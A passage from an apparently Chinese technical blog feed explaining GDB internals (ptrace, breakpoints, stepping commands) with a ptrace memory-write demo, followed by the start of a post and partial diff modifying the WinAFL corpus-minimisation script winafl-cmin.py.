状态。</p><p>当一个进程被标记为 <code>PTRACE</code> 状态后，调用 <code>exec()</code> 函数去执行一个外部程序时，将会暂停当前进程的运行，并且发送一个 <code>SIGCHLD</code> 给父进程。父进程接收到 <code>SIGCHLD</code> 信号后就可以对被调试的进程进行调试。</p><p>我们来看看 <code>exec()</code> 函数是怎样实现上述功能的，<code>exec()</code> 函数的执行过程为 <code>sys_execve() -&gt; do_execve() -&gt; load_elf_binary()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">load_elf_binary</span><span class="params">(struct linux_binprm * bprm, struct pt_regs * regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (current-&gt;ptrace &amp; PT_PTRACED)</span><br><span class="line">        send_sig(SIGTRAP, current, <span class="number">0</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当进程被标记为 <code>PTRACE</code> 状态时，执行 <code>exec()</code> 函数后便会发送一个 <code>SIGTRAP</code> 的信号给当前进程。信号是通过 <code>do_signal()</code> 函数进行处理的，而对 <code>SIGTRAP</code> 信号的处理逻辑如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_signal</span><span class="params">(struct pt_regs *regs, <span class="keyword">sigset_t</span> *oldset)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> signr;</span><br><span class="line"></span><br><span class="line">        spin_lock_irq(&amp;current-&gt;sigmask_lock);</span><br><span class="line">        signr = dequeue_signal(&amp;current-&gt;blocked, &amp;info);</span><br><span class="line">        spin_unlock_irq(&amp;current-&gt;sigmask_lock);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果进程被标记为 PTRACE 状态</span></span><br><span class="line">        <span class="keyword">if</span> ((current-&gt;ptrace &amp; PT_PTRACED) &amp;&amp; signr != SIGKILL) &#123;</span><br><span class="line">            <span class="comment">/* 让调试器运行  */</span></span><br><span class="line">            current-&gt;exit_code = signr;</span><br><span class="line">            current-&gt;state = TASK_STOPPED;   <span class="comment">// 让自己进入停止运行状态</span></span><br><span class="line">            notify_parent(current, SIGCHLD); <span class="comment">// 发送 SIGCHLD 信号给父进程</span></span><br><span class="line">            schedule();                      <span class="comment">// 让出CPU的执行权限</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码主要做了3件事：</p><ol><li>如果当前进程被标记为 PTRACE 状态，那么就使自己进入停止运行状态。</li><li>发送 SIGCHLD 信号给父进程。</li><li>让出 CPU 的执行权限，使 CPU 执行其他进程。</li></ol><p>当父进程（调试进程）接收到 <code>SIGCHLD</code> 信号后，表示被调试进程已经标记为被追踪状态并且停止运行，那么调试进程就可以开始进行调试了</p><h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><h3 id="断点属性"><a href="#断点属性" class="headerlink" title="断点属性"></a>断点属性</h3><ul><li>是否有条件（由 condition 命令修改）  </li><li>是否有忽略次数 （由 ignore 命令修改）</li><li>是否只针对某个线程有效（由 break 命令的 thread 参数指定）</li><li>是否是临时断点（由 tbreak 命令插入）</li></ul><h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><p>当我们用 GDB 设置断点时, GDB 会把断点处的指令修改成 <code>int 3</code>，同时把断点信息及修改前的指令保存起来. 当被调试子进程运行到断点处时, 便会执行 <code>int 3</code>命令, 从而产生 SIGTRAP 信号. 由于 GDB 已经用 ptrace 和调试进程建立了跟踪关系, 此时的 SIGTRAP 信号会被发送给 GDB, GDB 通过和已有的断点信息做对比 (通过指令位置) 来判断这次 SIGTRAP 是不是一个断点.如果是断点的话, 就回等待用户的输入以做进一步的处理. 如果用户的命令是继续执行的话, GDB 就会先恢复断点处的指令, 然后执行对应的代码.</p><blockquote><p>x86系列处理器从其第一代产品英特尔8086开始就提供了一条专门用来支持调试的指令，即INT  3。简单地说，这条指令的目的就是使CPU中断（break）到调试器，以供调试者对执行现场进行各种分析。当CPU执行到INT 3指令时，由于INT  3指令的设计目的就是中断到调试器，因此，CPU执行这条指令的过程也就是产生断点异常（breakpoint  exception，简称#BP）并转去执行异常处理例程的过程。在跳转到处理例程之前，CPU会保存当前的执行上下文，包括段寄存器、程序指针寄存器等内容。      </p></blockquote><p>上述描述的是软件断点，相应的还有硬件断点</p><blockquote><p>X86系统提供8个调试寄存器（DR0~DR7）和2个MSR用于硬件调试。其中前四个DR0 ~ DR3是硬件断点寄存器，可以放入内存地址或者IO地址，还可以设置为执行、修改等条件。CPU在执行的到这里并满足条件会自动停下来。</p></blockquote><h3 id="断点判断"><a href="#断点判断" class="headerlink" title="断点判断"></a>断点判断</h3><ul><li><p>导致目标程序本次停止运行的信号是不是 SIGTRAP </p></li><li><p>gdb把所有的断点位置都存放在一个链表中，命中判定即把被调试程序当前停止的位置和链表中的断点位置进行比较，看是断点产生的信号，还是无关信号。</p></li><li><p>若断点存在条件，此时条件是否满足</p></li><li><p>断点的忽略次数此时是否为 0 </p></li><li><p>若断点只针对某个线程有效，那么遇到该断点的线程是否就是断 点所设定的线程</p></li></ul><p>若前两个条件之一不满足，则认为目标程序本次是因随机信号而停止。 若后三个条件之一不满足，则认为目标程序本次没有命中断点， gdb 会让其继续运行。</p><h3 id="断点处理"><a href="#断点处理" class="headerlink" title="断点处理"></a>断点处理</h3><p>临时断点：当判定为断点命中之后，若该断 点为临时断点， gdb 就会将这个断点删除。也就是说，临时断点只命 中一次。可能用到临时断点的场合： </p><ul><li><p>用户通过 tbreak 命令显式插入</p></li><li><p>next 、 nexti 、 step 命令需要跨越函数调用的时候，由 gdb 自动 在函数返回地址处插入临时断点 </p></li><li><p>finish 命令需要在当前函数返回地址处插入临时断点</p></li><li><p>带参数的 until 命令需要在当前函数返回地址以及参数指定地址插 入临时断点 </p></li><li><p>在不支持硬件单步的架构上， gdb 需要逐指令插入临时断点来实 现软件单步</p></li></ul><p>gdb 将断点实际插入目标程序的时机：</p><p>当用户通过 break 命令设置一 个断点时，这个断点并不会立即生效，因为 gdb 此时只是在内部的断 点链表中为这个断点新创建了一个节点而已。 gdb 会在用户下次发出 继续目标程序运行的命令时，将所有断点插入目标程序，新设置的断 点到这个时候才会实际存在于目标程序中。与此相呼应，当目标程序 停止时， gdb 会将所有断点暂时从目标程序中清除。 </p><p>断点命中失败的情况下，跨越断点继续运行的过程： </p><ul><li>清除断点 </li><li>单步到断点的下一条指令 </li><li>恢复断点 </li><li>继续目标程序运行</li></ul><h3 id="修改子进程内存"><a href="#修改子进程内存" class="headerlink" title="修改子进程内存"></a>修改子进程内存</h3><p>gdb在调试的时候会修改断点处二进制码为0xcc，我们通过下面的例子来演示父进程如何修改子进程的内存:</p><ul><li>父进程创建子进程, 并先让子进程 sleep 一段时间以保证父进程能更早运行;</li><li>父进程通过 <code>PTRACE_ATTACH</code> 来和子进程建立跟踪关系;</li><li>父进程修改子进程的内存数据;</li><li>父进程通过调用 <code>PTRACE_CONT</code> 让子进程恢复执行;</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW(call) (&#123; int _ret = (int)(call); printf(<span class="meta-string">&quot;%s -&gt; %d\n&quot;</span>, #call, _ret); <span class="meta-keyword">if</span> (_ret &lt; 0) &#123; perror(NULL); &#125;&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> changeme[] = <span class="string">&quot;This is  a test&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">char</span> cdata[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">int64_t</span> data;</span><br><span class="line">    &#125; u = &#123; <span class="string">&quot;Hijacked&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (pid) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">/* child */</span></span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Children Message: %s\n&quot;</span>, changeme);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>: <span class="comment">/* parent */</span></span><br><span class="line">            SHOW(ptrace(PTRACE_ATTACH, pid, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">            SHOW(ptrace(PTRACE_POKEDATA, pid, changeme, u.data));</span><br><span class="line">            SHOW(ptrace(PTRACE_CONT, pid, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Parent Message: %s\n&quot;</span>, changeme);</span><br><span class="line">            wait(<span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ptrace(PTRACE_ATTACH, pid, 0, 0) -&gt; 0</span><br><span class="line">ptrace(PTRACE_POKEDATA, pid, changeme, u.data) -&gt; 0</span><br><span class="line">ptrace(PTRACE_CONT, pid, 0, 0) -&gt; 0</span><br><span class="line">Parent Message: This is  a test</span><br><span class="line"></span><br><span class="line">Children Message: Hijacked a test</span><br></pre></td></tr></table></figure><p>可以看出子进程中的字符串已经被修改了, 而父进程中的字符串依旧保持不变.</p><p>在调用 <code>ptrace(PTRACE_POKEDATA, pid, changeme, u.data)</code> 时, 最后一个参数实际上是按照 <code>int64_t</code> 来处理的.</p><h2 id="next"><a href="#next" class="headerlink" title="next"></a>next</h2><ul><li><p>NEXT 命令实现的是 C 代码级的单步。</p></li><li><p>执行 next 命令时， gdb 会计算出当前停止位置的 c 语句的第一条 指令的地址作为 step_range_start ，然后计算出当前停止位置下一 行的 c 语句的第一条指令的地址作为 step_range_end ，随后控制目标程序从当前停止位置开始走指令级单步，直至 pc 超出 step range 为止。</p></li><li><p>next 命令的结束条件： pc &lt; step_range_start || pc &gt;= step_range_end 。 </p></li><li><p>之所以不能简单地判断 pc 是否到达 step_range_end ，是因为 step_range_end 仅仅是 c 源代码意义上的下一行的第一条指令的地址，目标程序实际运行时未必就会到达那里。因此， next 命令的结束条件可以理解为只要 pc 离开当前源代码行即可。</p><p>  <img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/blog/image-20210527093518978.png" alt="image-20210527093518978"></p></li></ul><h3 id="跨越函数"><a href="#跨越函数" class="headerlink" title="跨越函数"></a>跨越函数</h3><p>我们知道 next 是不会进入函数内部的，下面会介绍一下其原理。</p><p>next 命令跨越函数调用的过程： </p><ul><li>从当前停止位置开始走<strong>指令级</strong>单步； </li><li>走到子函数第一条指令时发现是函数调用，就在函数返 回地址插入一个临时断点； </li><li>让目标程序继续运行，通过子函数体，直至遇到之前插入的临时断点； </li><li>继续走指令级单步，直至满足 next 命令的结束条件为止。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/blog/image-20210527093915896.png" alt="image-20210527093915896"></p><h2 id="step-、nexti-、-stepi"><a href="#step-、nexti-、-stepi" class="headerlink" title="step 、nexti 、 stepi"></a>step 、nexti 、 stepi</h2><ul><li>step 命令和 next 命令一样，也是实现 c 源代码级的单步，对于简单 语句， step 完全等同于 next 。唯一不同的是，若单步过程中遇到函 数调用， step 命令将停止在子函数的起始处，而不是将其跨越（无 调试信息的子函数除外）。  </li><li>nexti 命令实现指令级单步，和 next 命令类似， nexti 命令单步过程中不会进入子函数调用。 </li><li>stepi 命令实现指令级单步，而且是严格的指令级单步，每次直接走 一条指令后即停止，不再区分是否存在函数调用。</li></ul><h2 id="finish"><a href="#finish" class="headerlink" title="finish"></a>finish</h2><p>finish 命令会让目标程序继续执行完当前函数的剩余语句，并停止在 返回到上一级函数之后的第一条指令处（也就是调用当前函数时的返 回地址）。因此，实现 finish 命令时，只需找到当前函数的返回地址 ，并在该处插入一个临时断点，然后让目标程序继续运行，直至遇到 该断点而停止。</p><h2 id="随机信号的处理"><a href="#随机信号的处理" class="headerlink" title="随机信号的处理"></a>随机信号的处理</h2><p>对于 gdb 而言，导致目标程序本次停止的信号有随机和非随机之分。 非随机信号是指 gdb 已经预知其会发生或者本身就是 gdb 导致的信 号，也就是说，这些信号是具有明确的调试含义的，比如遇到断点指 令时的 SIGTRAP 。而随机信号则是 gdb 没有预知的、不了解其实际 含义的信号，比如因程序异常而导致的 SIGSEGV ，因定时机制而产 生的 SIGALRM ，或者是用户程序自己内部使用的信号。 </p><p>对于随机信号， gdb 提供了两个属性来决定对它的处理方式。一个是 当此信号发生时是否停止目标程序的运行，一个是在目标程序因此信 号而停止之后，用户发出继续目标程序运行的命令时，是否将此信号 交付给目标程序。 </p><p>可通过 info signals 命令查看信号的配置属性，并通过 handle signal 命令来修改信号的属性。</p><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><p>先占个坑。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://hiberabyss.github.io/2018/04/04/gdb-internal/">https://hiberabyss.github.io/2018/04/04/gdb-internal/</a></p><p><a href="https://www.cnblogs.com/xsln/p/ptrace.html">https://www.cnblogs.com/xsln/p/ptrace.html</a></p><p><a href="http://www.kgdb.info/wp-content/uploads/2011/04/GdbPrincipleChinese.pdf">http://www.kgdb.info/wp-content/uploads/2011/04/GdbPrincipleChinese.pdf</a></p><p><a href="https://cloud.tencent.com/developer/article/1742878">https://cloud.tencent.com/developer/article/1742878</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> debug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> debug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>魔改 Winafl-cmin.</title>
      <link href="posts/d9205468/"/>
      <url>posts/d9205468/</url>
      
        <content type="html"><![CDATA[<p>魔改的原因是某次在精简大概 2w+的样本时候，程序跑到最后一个文件崩溃了…这不仅要浪费大量时间去再次精简，对于我本人的心情也影响极大，所以抽了一点时间对该工具进行了魔改，魔改的也非常简单，但是基本解决了我目前所碰到的问题。</p><p>魔改后支持如下：</p><ol><li>支持 python3</li><li>增加 <code>output.txt</code> <code>crash_files.txt</code> <code>hang_files.txt</code> 分别记录输出文件、crash 文件、 hang 文件</li><li>增加 <code>-move</code> 命令，用以移动文件，我预想的场景是：精简过程中程序卡死，我们可以把已经筛选过得文件剔除出来，会节约很多时间。但是相应的精简的效果可能会对比正常结束略差，我们进行二次精简就可以了。</li><li>增加 <code>-copy</code> 命令，用以复制文件。</li></ol><p>大致更改的代码如下：</p><p><a href="https://github.com/0xfocu5/tools/blob/main/my-cmin.py">https://github.com/0xfocu5/tools/blob/main/my-cmin.py</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- winafl-cmin.py2021-05-18 15:02:53.000000000 +0800</span></span><br><span class="line"><span class="comment">+++ my-cmin.py2021-05-20 11:54:55.000000000 +0800</span></span><br><span class="line"><span class="meta">@@ -286,6 +286,7 @@</span></span><br><span class="line">         &#x27;--skip-dry-run&#x27;, action = &#x27;store_true&#x27;, default = False,</span><br><span class="line">         help = &#x27;Skip the dry-run step even if it failed&#x27;</span><br><span class="line">     )</span><br><span class="line"><span class="addition">+    </span></span><br><span class="line">     parser.add_argument(</span><br><span class="line">         &#x27;target_cmdline&#x27;, nargs = argparse.REMAINDER,</span><br><span class="line">         help = &#x27;target command line&#x27;</span><br><span class="line"><span class="meta">@@ -305,10 +306,46 @@</span></span><br><span class="line">     # Now we can copy the file to destination</span><br><span class="line">     shutil.copy(filepath, new_dest)</span><br><span class="line">     </span><br><span class="line"><span class="addition">+def MvArgsparse():</span></span><br><span class="line"><span class="addition">+    parser = argparse.ArgumentParser(description=&#x27;Move setting&#x27;)</span></span><br><span class="line"><span class="addition">+    parser.add_argument(</span></span><br><span class="line"><span class="addition">+        &#x27;-mv&#x27;, &#x27;--move&#x27;, action = &#x27;append&#x27;, required = True,</span></span><br><span class="line"><span class="addition">+        metavar = &#x27;dir&#x27;, help = &#x27;Move files to output folder.&#x27;</span></span><br><span class="line"><span class="addition">+        &#x27; Mostly used for reuse after the process is stuck.&#x27;</span></span><br><span class="line"><span class="addition">+    )</span></span><br><span class="line"><span class="addition">+    parser.add_argument(</span></span><br><span class="line"><span class="addition">+        &#x27;-o&#x27;, &#x27;--output&#x27;, required = True,</span></span><br><span class="line"><span class="addition">+        metavar = &#x27;dir&#x27;, help = &#x27;output directory for files.&#x27;</span></span><br><span class="line"><span class="addition">+        &#x27;Absolute path is better.&#x27;</span></span><br><span class="line"><span class="addition">+    )</span></span><br><span class="line"><span class="addition">+    return parser.parse_args()</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+def CpArgsparse():</span></span><br><span class="line"><span class="addition">+    parser = argparse.ArgumentParser(description=&#x27;Copy setting&#x27;)</span></span><br><span class="line"><span class="addition">+    parser.add_argument(</span></span><br><span class="line"><span class="addition">+        &#x27;-cp&#x27;, &#x27;--copy&#x27;, action = &#x27;append&#x27;, required = True,</span></span><br><span class="line"><span class="addition">+        metavar = &#x27;dir&#x27;, help = &#x27;Copy files to output folder.&#x27;</span></span><br><span class="line"><span class="addition">+        &#x27; Mostly used for reuse after the process is stuck.&#x27;</span></span><br><span class="line"><span class="addition">+    )</span></span><br><span class="line"><span class="addition">+    parser.add_argument(</span></span><br><span class="line"><span class="addition">+        &#x27;-o&#x27;, &#x27;--output&#x27;, required = True,</span></span><br><span class="line"><span class="addition">+        metavar = &#x27;dir&#x27;, help = &#x27;output directory for files.&#x27;</span></span><br><span class="line"><span class="addition">+        &#x27;Absolute path is better.&#x27;</span></span><br><span class="line"><span class="addition">+    )</span></span><br><span class="line"><span class="addition">+    return parser.parse_args()</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+def check_file(file):</span></span><br><span class="line"><span class="addition">+    if os.path.isfile(file):</span></span><br><span class="line"><span class="addition">+        print(&#x27;[+] %s has been deleted, new file will be generated.&#x27; %file)</span></span><br><span class="line"><span class="addition">+        command = &quot;del &quot;</span></span><br><span class="line"><span class="addition">+        command = command + file</span></span><br><span class="line"><span class="addition">+        os.system(command)</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> def main(argc, argv):</span><br><span class="line"><span class="deletion">-    print &#x27;corpus minimization tool for WinAFL by &lt;0vercl0k@tuxfamily.org&gt;&#x27;</span></span><br><span class="line"><span class="deletion">-    print &#x27;Based on WinAFL by &lt;ifratric@google.com&gt;&#x27;</span></span><br><span class="line"><span class="deletion">-    print &#x27;Based on AFL by &lt;lcamtuf@google.com&gt;&#x27;</span></span><br><span class="line"><span class="addition">+    print(&#x27;corpus minimization tool for WinAFL by &lt;0vercl0k@tuxfamily.org&gt;&#x27;)</span></span><br><span class="line"><span class="addition">+    print(&#x27;Based on WinAFL by &lt;ifratric@google.com&gt;&#x27;)</span></span><br><span class="line"><span class="addition">+    print(&#x27;Based on AFL by &lt;lcamtuf@google.com&gt;&#x27;)</span></span><br><span class="line"><span class="addition">+    print(&#x27;Changed by 0xfocu5 &lt;o0xfocu5@gmail.com&gt;&#x27;)</span></span><br><span class="line"> </span><br><span class="line">     logging.basicConfig(</span><br><span class="line">         filename = &#x27;winafl-cmin.log&#x27;,</span><br><span class="line"><span class="meta">@@ -316,7 +353,48 @@</span></span><br><span class="line">         format = &#x27;%(asctime)s [%(levelname)-5.5s] [%(funcName)s] %(message)s&#x27;</span><br><span class="line">     )</span><br><span class="line"> </span><br><span class="line"><span class="addition">+    if (argv[1] == &#x27;-mv&#x27; or argv[1] == &quot;-move&quot;):</span></span><br><span class="line"><span class="addition">+        args = MvArgsparse()</span></span><br><span class="line"><span class="addition">+        file = &quot;&quot;.join(args.move)  </span></span><br><span class="line"><span class="addition">+        if os.path.isfile(file) is False:</span></span><br><span class="line"><span class="addition">+            print(&#x27;[!] The argument of \&#x27;- move\&#x27; %s is not a file. Or it doesn\&#x27;t exist&#x27; %(file))</span></span><br><span class="line"><span class="addition">+            return 1</span></span><br><span class="line"><span class="addition">+        if os.path.isdir(args.output):</span></span><br><span class="line"><span class="addition">+           print(&#x27;[!] %s already exists, please remove it to avoid data loss.&#x27; %(args.output))</span></span><br><span class="line"><span class="addition">+           return 1</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        path = os.getcwd()+&quot;\\&quot;+str(args.output)</span></span><br><span class="line"><span class="addition">+        os.mkdir(args.output)</span></span><br><span class="line"><span class="addition">+        for line in open(file): </span></span><br><span class="line"><span class="addition">+            line = line.strip(&quot;\n&quot;)</span></span><br><span class="line"><span class="addition">+            print(&quot;Move %s to %s&quot; %(line, path))</span></span><br><span class="line"><span class="addition">+            shutil.move(line, path)</span></span><br><span class="line"><span class="addition">+        return 0</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    